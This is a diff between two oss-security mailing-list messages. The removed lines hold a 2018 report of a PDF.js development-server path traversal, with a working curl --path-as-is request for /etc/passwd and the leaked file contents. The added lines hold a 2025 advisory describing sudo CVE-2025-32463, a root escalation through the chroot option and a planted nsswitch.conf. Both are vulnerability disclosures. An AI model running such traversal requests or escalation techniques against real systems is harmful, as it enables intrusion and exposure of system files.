@@ -1,9 +1,4 @@
-X-VM-v5-Data: ([nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
-	["1684" "Saturday" "24" "November" "2018" "13:16:49" "+0530" "Dhiraj Mishra" "mishra.dhiraj95@gmail.com" "<CAG8b5tTuLM-jHfWRz1Cvi9K_OAbn7h5EHGh2xicR2YR7Nr45Gw@mail.gmail.com>" "52" "[oss-security] Path traversal in mozilla PDF.js [Unpatched]" "^Date:" nil nil "11" "2018112407:46:49" "[oss-security] Path traversal in mozilla PDF.js [Unpatched]" (number mark "        mishra.dhira Nov 24   52/1684  " thread-indent "\"[oss-security] Path traversal in mozilla PDF.js [Unpatched]\"\n") nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
-	nil)
-X-Mozilla-Status: 0001
-X-Mozilla-Status2: 00000000
-Received: (qmail 32494 invoked by uid 550); 24 Nov 2018 11:28:47 -0000
+Received: (qmail 28394 invoked by uid 550); 30 Jun 2025 16:14:43 -0000
 Mailing-List: contact oss-security-help@lists.openwall.com; run by ezmlm
 Precedence: bulk
 List-Post: <mailto:oss-security@lists.openwall.com>
@@ -11,90 +6,74 @@ List-Help: <mailto:oss-security-help@lists.openwall.com>
 List-Unsubscribe: <mailto:oss-security-unsubscribe@lists.openwall.com>
 List-Subscribe: <mailto:oss-security-subscribe@lists.openwall.com>
 List-ID: <oss-security.lists.openwall.com>
-Received: (qmail 28059 invoked from network); 24 Nov 2018 07:47:13 -0000
-DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
-        d=gmail.com; s=20161025;
-        h=mime-version:from:date:message-id:subject:to;
-        bh=maLAhna8+1P6ub3fRzHrA6hfI4yK5MQ2o4E6j0eoX+0=;
-        b=Q03h+4a2pC9vMLCe/HJcJhUGNNZt99w3s/0XI40VPb821UiOOJMuIGOurBKupgvFzM
-         i5NgNm3PrRHWNoBp1Om/sZ9fR/NRitJOu9/zzMTtEPAXk+VhyHIyQs+PiqKS8hPR5EvE
-         RzI76HCPnSMW6lEkD47nkXFTOdPpnwh66Fq4yRliLSznUxXgvx3d2sLjujJdKjH68z4z
-         Y7kGxbHCHasuv0gZeBGOWGrb09mWrbmtYyZk6wFR71cs6RPYoo8QRp4oUgLrWjMmoZPS
-         RTMtZW+1IYV8CW3cpkLPg8zkFYv6MGJFcSj5v9O3GnqNTR0un4cezQtC1QqvEwPMWV1j
-         v6OA==
-X-Google-DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
-        d=1e100.net; s=20161025;
-        h=x-gm-message-state:mime-version:from:date:message-id:subject:to;
-        bh=maLAhna8+1P6ub3fRzHrA6hfI4yK5MQ2o4E6j0eoX+0=;
-        b=YXfIm8vP6UCZ1o60h1gGazAgRz5AUyEwCcphY2zipFCBLwNLXNShwrzJ5qFLDJC+oV
-         LU0Wpn961N7rp12iz89VtDPIqHpq7VKsdAP5lqjri/uOMTkKOdyVTCMpbLZ006xAvqUV
-         ZZA0jtT70p0YvyHp+eqQsxrKgbLpqk7JEutNC5hmw/TOa/7DLNOMkPHq3M+WaLfviLzM
-         s8ZKYMJebrCiilfZ8YbVtUCALv4HKHUa9ObKG0PDk/IHIGfMb8jYBDpzqDNHsQg1lZz8
-         7lKU/EjgsKJOJsI6lpXupCUs8LVpfmt9eoyVcgVzV76nHbTGi8gr1rorU2StMOCBUK+9
-         WKTw==
-X-Gm-Message-State: AA+aEWb9ThQlgS3hJsN2bZqhOnaIfVgq/mLCxRw8H6kQrkzElZBBXs3u
-	ty5cBQ66u/pRhfI+RW/TTYYlP0WiHZWFwFXHBn4d4GsM
-X-Google-Smtp-Source: AFSGD/U/R6pQp3cqwkCmSpRlZ6ZTuOh3kR+swQGLxBs6aiPBP7XmJ3NukuSNu4cAGUej9m78a44sSMdDNMt7d8vSHkQ=
-X-Received: by 2002:a63:bd51:: with SMTP id d17mr17330012pgp.443.1543045620906;
- Fri, 23 Nov 2018 23:47:00 -0800 (PST)
-MIME-Version: 1.0
-Message-ID: <CAG8b5tTuLM-jHfWRz1Cvi9K_OAbn7h5EHGh2xicR2YR7Nr45Gw@mail.gmail.com>
-Content-Type: multipart/alternative; boundary="0000000000001b3db6057b644e88"
-Date: Sat, 24 Nov 2018 13:16:49 +0530
-From: Dhiraj Mishra <mishra.dhiraj95@gmail.com>
 Reply-To: oss-security@lists.openwall.com
-Subject: [oss-security] Path traversal in mozilla PDF.js [Unpatched]
+x-ms-reactions: disallow
+Received: (qmail 10058 invoked from network); 30 Jun 2025 14:40:57 -0000
+DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed; d=sudo.ws; s=selector2;
+	t=1751294458; h=from:from:reply-to:subject:subject:date:date:to:to:cc:
+	 mime-version:mime-version:content-type:content-type;
+	bh=ZI9/Z7iB1VRk6pPVpl3wseH0XcXd5aDvYUe4zBlzlzU=;
+	b=IIyxUfbJdWtlJlp9VY7vSW/10ghububYmBXzxItLzNdBee0A3gLSAX+HucqFDxqpXa9Mwc
+	bEKYI1gk4n4IEnbllf1Du5PhWrh7E5SMEgKqiOLvrVbJzSOJO6sg88PD2SZcSQZBb8DuR3
+	vbGXPszHu+zeekcm89VphqwYyJDy0AEDw8qrcqTayPHywtTUofla58IQixzrjbrp0oWDPR
+	7IdVqrSBJlh4mGP0JqDcMX00RBXsVTAk8yUno06qj9TnEwD6GXzV/cpG28FmrENDvD1Sah
+	05T1mk42ROF55Lr5l98EBuMPQzwoyYOSY3ENM5NUthpyVqjbnKeGUUMXmpSGAA==
+From: "Todd C. Miller" <Todd.Miller@sudo.ws>
 To: oss-security@lists.openwall.com
+MIME-Version: 1.0
+Content-Type: text/plain; charset="us-ascii"
+Content-ID: <11867.1751294458.1@xerxes.sudo.ws>
+Date: Mon, 30 Jun 2025 08:40:58 -0600
+Message-ID: <0d043d8697db72f0@millert.dev>
+Subject: [oss-security] CVE-2025-32463: sudo local privilege escalation via chroot option
 
---0000000000001b3db6057b644e88
-Content-Type: text/plain; charset="UTF-8"
+An attacker can leverage sudo's -R (--chroot) option to run
+arbitrary commands as root, even if they are not listed in the
+sudoers file.
 
-## Summary
-A path traversal issue was observed in Mozilla PDF.js which is a PDF reader
-in JavaScript. This issue was observed while code review of PDF.js
-(gulpfile.js)(
-https://github.com/mozilla/pdf.js/blob/master/gulpfile.js#L1023), Mozilla
-team says "The server with pdf.js is intended to be a development server
-and should not be exposed to public networks. I suppose we could update the
-docs to state that." and a upstream bug was filed against the same (
-https://github.com/mozilla/pdf.js/issues/10249).
+Sudo versions affected:
 
-## Installation
-PDF.js is built into version 19+ of firefox and a chrome extension is also
-available on chrome web store. To install and get a local copy of PDF.js
-here are the below steps :
-$ git clone https://github.com/mozilla/pdf.js.git
-$ cd pdf.js
-$ npm install -g gulp-cli
-$ npm install
-$ gulp server
+    Sudo versions 1.9.14 to 1.9.17 inclusive are affected.
 
-##Exploitation
-I've used the attribute --path-as-is from cURL to verify this issue.
-$ curl --path-as-is -v http://127.0.0.1:8888/../../../../../../etc/passwd
-*   Trying 127.0.0.1...
-* TCP_NODELAY set
-* Connected to 127.0.0.1 (127.0.0.1) port 8888 (#0)
-> GET /../../../../../../etc/passwd HTTP/1.1
-> Host: 127.0.0.1:8888
-> User-Agent: curl/7.58.0
-> Accept: */*
->
-< HTTP/1.1 200 OK
-< Accept-Ranges: bytes
-< Content-Type: application/octet-stream
-< Content-Length: 2745
-< Date: Thu, 15 Nov 2018 06:34:32 GMT
-< Connection: keep-alive
-<
-root:x:0:0:root:/root:/bin/bash
-daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
-bin:x:2:2:bin:/bin:/usr/sbin/nologin
-sys:x:3:3:sys:/dev:/usr/sbin/nologin
-sync:x:4:65534:sync:/bin:/bin/sync
+CVE ID:
 
+    This vulnerability has been assigned CVE-2025-32463 in the
+    Common Vulnerabilities and Exposures database.
 
-Thank you
-Dhiraj (@mishradhiraj_)
+Details:
 
---0000000000001b3db6057b644e88--
+    Sudo's -R (--chroot) option is intended to allow the user to
+    run a command with a user-selected root directory if the sudoers
+    file allows it.  A change was made in sudo 1.9.14 to resolve
+    paths via chroot() using the user-specified root directory while
+    the sudoers file was still being evaluated.  It is possible for
+    an attacker to trick sudo into loading an arbitrary shared
+    library by creating an /etc/nsswitch.conf file under the
+    user-specified root directory.
+
+    The change from sudo 1.9.14 has been reverted in sudo 1.9.17p1
+    and the chroot feature has been marked as deprecated.  It will
+    be removed entirely in a future sudo release.  Because of the
+    way sudo resolves commands, supporting a user-specified chroot
+    directory is error-prone and this feature does not appear to
+    be widely used.
+
+    A more detailed description of the bug and its effects can be
+    found in the Stratascale advisory:
+    https://www.stratascale.com/vulnerability-alert-CVE-2025-32463-sudo-chroot
+
+Impact:
+
+    On systems that support /etc/nsswitch.conf a user may be able
+    to run arbitrary commands as root.
+
+Fix:
+
+    The bug is fixed in sudo 1.9.17p1.
+
+Credit:
+
+    Thanks to Rich Mirch from Stratascale Cyber Research Unit (CRU)
+    for reporting and analyzing the bug.  The Stratascale advisory
+    can be found at:
+    https://www.stratascale.com/vulnerability-alert-CVE-2025-32463-sudo-chroot
